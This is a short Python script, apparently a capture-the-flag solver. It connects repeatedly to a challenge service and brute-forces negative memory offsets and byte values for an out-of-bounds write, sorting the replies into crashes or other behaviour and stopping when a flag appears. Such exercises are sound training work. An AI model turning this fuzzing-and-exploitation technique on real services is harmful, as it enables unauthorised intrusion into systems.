import sys, re, time, socket
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
host, port = open(r"./_z_146url.txt").read().split()
port = int(port)


def attempt(offset, value, wait=1.2):
    try:
        s = socket.create_connection((host, port), timeout=6)
        s.settimeout(wait)
    except Exception:
        return None
    try:
        s.sendall(str(offset).encode() + b"\n" + bytes([value]))
        out = b""
        t0 = time.time()
        while time.time() - t0 < wait:
            try:
                c = s.recv(4096)
                if not c:
                    break
                out += c
                if b"Welcome to my stream" in out:
                    break
            except socket.timeout:
                break
        return out.decode("latin-1", "replace")
    except Exception:
        return None
    finally:
        s.close()


def shown(r):
    if not r or "Value: " not in r:
        return None
    seg = r.split("Value: ", 1)[1].split("Welcome to my stream", 1)[0]
    return seg.strip()


print("=== balayage fin -5240..-5360, valeurs alignees ===", flush=True)
for off in range(-5240, -5361, -8):
    for v in range(0, 256, 16):
        seg = shown(attempt(off, v)) or ""
        tag = "crash" if "Segmentation" in seg else ("normal" if "random string" in seg else "AUTRE")
        if tag == "AUTRE" or "Congrats" in seg or "academy{" in seg:
            print("  off=%d val=0x%02x [%s] -> %r" % (off, v, tag, seg[:100]), flush=True)
        if "academy{" in seg or "Congrats" in seg:
            m = re.search(r"(?:academy|picoCTF)\{[^}]*\}", seg)
            print("FLAG:", m.group(0) if m else None)
            sys.exit(0)
print("fin du balayage", flush=True)
